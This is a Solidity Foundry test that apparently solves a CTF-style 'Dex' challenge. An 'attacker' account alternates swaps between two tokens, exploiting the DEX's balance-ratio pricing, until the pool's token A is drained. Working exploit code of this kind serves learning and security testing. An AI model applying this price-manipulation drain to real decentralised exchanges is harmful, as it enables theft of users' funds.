// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Dex, SwappableToken} from "../src/Swap.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTest is Test {
    SwappableToken public swappabletokenA;
    SwappableToken public swappabletokenB;
    Dex public dex;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!
    function setUp() public {
        dex = new Dex();
        swappabletokenA = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableToken(address(dex),"Swap","SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dex.setTokens(address(swappabletokenA), address(swappabletokenB));

        dex.approve(address(dex), 100);
        dex.addLiquidity(address(swappabletokenA), 100);
        dex.addLiquidity(address(swappabletokenB), 100);

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
        vm.label(attacker, "Attacker");
    }


    function test_drain() public {
        //0
        vm.startPrank(attacker);

        uint256 initialSwapAmount = 10;
        dex.approve(address(dex), type(uint256).max);
        dex.swap(address(swappabletokenA), address(swappabletokenB), initialSwapAmount);


        //dex.getSwapPrice(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker))
        uint256 balanceToken1 = swappabletokenA.balanceOf(address(attacker));
        uint256 balanceToken2 = swappabletokenB.balanceOf(address(attacker));


        console.log("Attackers Token 1 Balance is ", balanceToken1);
        console.log("Attackers Token 2 Balance is ", balanceToken2);
        

        while (swappabletokenA.balanceOf(address(dex))
                > dex.getSwapPrice(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker))){

            // uint256 swapAmount = 10 ;

            // if (balanceToken1 > 0 && IERC20(address(swappabletokenB)).balanceOf(address(dex)) > 0){
            //     uint256 swapAmount = balanceToken1;
            //     swappabletokenA.approve(address(dex), swapAmount);
            //     dex.swap(address(swappabletokenA),address(swappabletokenB),swapAmount);
            // } else if(balanceToken2 > 0 && IERC20(address(swappabletokenA)).balanceOf(address(dex)) > 0) {
            //     uint256 swapAmount = balanceToken2;
            //     swappabletokenB.approve(address(dex), swapAmount);
            //     dex.swap(address(swappabletokenB),address(swappabletokenA),swapAmount);
            // }

            dex.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker));
            dex.swap(address(swappabletokenA), address(swappabletokenB), swappabletokenA.balanceOf(attacker));

            
        }   

        dex.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(address(dex)));
        

        uint256 dexBalanceToken1 =  swappabletokenA.balanceOf(address(dex));
        uint256 dexBalanceToken2 = swappabletokenB.balanceOf(address(dex));

        console.log("Dex Final Token A  balance is " , dexBalanceToken1);
        console.log("Dex Final Token B Balance isn ", dexBalanceToken2);

        vm.stopPrank();

        assertEq(dexBalanceToken1, 0);
    }




    

}
